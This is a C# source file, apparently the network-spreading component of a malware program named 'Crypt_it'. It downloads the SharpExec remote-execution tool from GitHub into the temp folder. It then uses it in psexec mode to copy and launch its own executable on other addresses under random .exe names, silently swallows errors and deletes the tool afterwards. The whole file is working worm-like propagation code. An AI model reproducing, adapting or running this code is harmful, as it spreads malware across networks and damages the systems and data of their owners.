using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Reflection;

namespace Crypt_it;

internal class NetworkSpreading
{
	public static List<string> lanList = new List<string>();

	public static string MyIP = "";

	public static void Run()
	{
		try
		{
			lanList = GetLocalNetwork();
			string text = "";
			if (lanList.Count > 0)
			{
				text = DownloadTool();
			}
			if (File.Exists(text))
			{
				foreach (string lan in lanList)
				{
					string text2 = (MyIP = lan);
					foreach (string lan2 in lanList)
					{
						if (!(lan2 == MyIP))
						{
							Program.ProcessCommand(text, "-m=psexec -i=" + MyIP + " -d=" + lan2 + " -f=" + Assembly.GetEntryAssembly()!.Location + " -e=" + Path.Combine(Path.GetTempPath(), Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe"));
						}
					}
				}
			}
			File.Delete(text);
		}
		catch
		{
		}
	}

	public static List<string> GetLocalNetwork()
	{
		List<string> list = new List<string>();
		IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
		IPAddress[] addressList = hostEntry.AddressList;
		foreach (IPAddress iPAddress in addressList)
		{
			if (iPAddress.AddressFamily.ToString() == "InterNetwork")
			{
				list.Add(iPAddress.ToString());
			}
		}
		return list;
	}

	public static string DownloadTool()
	{
		if (IntPtr.Size == 8)
		{
			return DownloadFile(new Uri("https://raw.githubusercontent.com/anthemtotheego/SharpExec/master/CompiledBinaries/SharpExec_x64.exe"));
		}
		return DownloadFile(new Uri("https://raw.githubusercontent.com/anthemtotheego/SharpExec/master/CompiledBinaries/SharpExec_x86.exe"));
	}

	public static string DownloadFile(Uri Url)
	{
		string path = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
		WebClient webClient = new WebClient();
		webClient.DownloadFile(Url, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}
}
